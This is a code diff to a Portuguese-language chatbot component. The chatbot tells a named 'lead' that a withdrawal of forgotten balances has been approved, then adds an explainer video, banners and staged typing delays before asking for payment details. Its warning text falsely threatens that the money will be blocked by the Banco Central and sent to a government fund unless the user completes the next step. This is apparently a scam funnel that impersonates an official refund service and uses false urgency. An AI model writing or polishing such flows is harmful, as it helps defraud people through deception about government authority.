@@ -226,9 +226,25 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
           setTyping(true);
           setTimeout(() => {
             setTyping(false);
-            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada.\n\nClique no botão abaixo para efetuar a transferência do valor de **${leadValue}** para a sua conta.`, [
-              { text: "Efetuar saque", action: "proceed_after_video" }
-            ]);
+            addBotMessage(`Parabéns, ${leadName}!\n\nA sua solicitação de saque foi aprovada no valor de **${leadValue}** referentes a saldos esquecidos.`, undefined, "/assets/banners/banner_saque_aprovado.png");
+            
+            setTimeout(() => {
+              setTyping(true);
+              setTimeout(() => {
+                setTyping(false);
+                addBotMessage(`Assista ao vídeo abaixo para entender como realizar o saque do seu valor disponível:`, undefined, undefined, undefined, undefined, "/assets/banners/video_explicacao.mp4");
+                
+                setTimeout(() => {
+                  setTyping(true);
+                  setTimeout(() => {
+                    setTyping(false);
+                    addBotMessage(`Clique no botão abaixo para prosseguir com a liberação da transferência.`, [
+                      { text: "Efetuar saque", action: "proceed_after_video" }
+                    ]);
+                  }, 1500);
+                }, 2000);
+              }, 2500);
+            }, 1500);
           }, 2500);
         }, 1500);
       }, 800);
@@ -258,8 +274,8 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
       setTimeout(() => {
         setTyping(false);
         addBotMessage(`**ATENÇÃO:** Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber o valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central.\n\nCaso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos.\n\n**Observação:** Isso só acontecerá se você não concluir a etapa a seguir.`, [
-           { text: "Efetuar Saque", action: "ask_pix" }
-        ]);
+           { text: "Entendi, quero receber", action: "ask_pix" }
+        ], "/assets/banners/banner_atencao.png");
       }, 1500);
     }
     else if (action === "ask_pix") {
